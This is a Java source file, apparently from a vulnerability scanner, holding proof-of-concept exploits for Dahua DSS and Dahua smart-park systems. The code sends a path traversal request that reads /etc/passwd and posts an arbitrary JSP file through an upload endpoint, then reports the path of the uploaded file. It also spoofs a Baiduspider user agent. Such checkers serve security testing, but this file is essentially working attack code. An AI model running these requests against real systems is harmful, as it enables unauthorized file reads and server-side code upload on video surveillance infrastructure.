package vuls;

import Utils.RandomStringGenerator;
import Utils.httpRequest;
import okhttp3.*;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class check {

    public String checkAction(Map deserializeMap, String vulName, String url) throws IOException {

        String result;
        if ("dahua_dss_fileDown".equals(vulName)) {
            result = dahua_dss_fileDown(url);
        } else if ("大华智慧园区文件上传".equals(vulName)) {
            result = zhihuiyuanqu_upload(url);
        } else if (vulName.contains("反序列化")){
            String path = (String) deserializeMap.get(vulName);
            result = deserializeAction(url, path, vulName);
        }else {
            result = "该poc暂未收录";
        }
        return result;

    }
    public String dahua_dss_fileDown(String url) {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        Response response = null;
        try {
            String payload = "portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd";
            response = httpRequest.get(url + payload,headers);
            String statusCode = String.valueOf(response.code());
            String responseBody = response.body().string();
            if ("200".equals(statusCode) && responseBody.contains("root")) {
               return "[+] 漏洞存在!!!!";
            } else {
                return "[-] 漏洞不存在";
            }
        } catch (IOException e) {

            return "[-]请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }
    public String zhihuiyuanqu_upload(String url) {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
//        headers.put("Content-Type","multipart/form-data; boundary=f3aeb22be281d77542546a2f71e20982");
        Response response = null;
        String payload = "emap/devicePoint_addImgIco?hasSubsystem=true";
        String data = "<%out.println(\"vultest\");%>";
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("upload", "a.jsp",
                        RequestBody.create(MediaType.parse("application/octet-stream"), data))
                .build();
        System.out.println(requestBody);
        try {
            response = httpRequest.post(url + payload,headers,requestBody);
//            System.out.println(response);
            String statusCode = String.valueOf(response.code());
            String responseBody = response.body().string();
//            System.out.println(responseBody);
            if ("200".equals(statusCode) && responseBody.contains("on.jsp")) {
                String pattern = "ico_res_[0-9a-fA-F]+_on.jsp";
                Pattern r = Pattern.compile(pattern);
                Matcher m = r.matcher(responseBody);
                if (m.find()){
                    System.out.println(url+"upload/emap/society_new/"+m.group());
                }
                return "[+] 漏洞存在!!!!\n"+"文件路径："+url+"upload/emap/society_new/"+m.group();
            } else {
                return "[-] 漏洞不存在";
            }
        } catch (IOException e) {

            return "[-]请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }
    public String deserializeAction(String url, String path, String vulName){
        return url+vulName+path;
    }
}
